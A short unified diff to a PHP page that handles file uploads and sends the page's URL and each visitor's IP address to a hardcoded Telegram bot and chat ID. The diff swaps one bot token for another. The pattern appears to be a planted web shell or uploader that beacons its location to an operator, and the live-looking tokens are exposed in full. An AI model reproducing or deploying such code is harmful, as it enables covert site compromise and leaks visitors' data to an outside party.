@@ -81,7 +81,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 }
 ?>
 <?php
-$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
+$telegram_token = "7479232652:AAHoyJCGVSQ6WPBPfDq34xedR0ElOa3GxLg"; 
 $chat_id = "6812471405"; 
 $file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $ip_address = $_SERVER['REMOTE_ADDR'];
@@ -217,3 +217,4 @@ sendMessageToTelegram($telegram_token, $chat_id, $message);
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
+
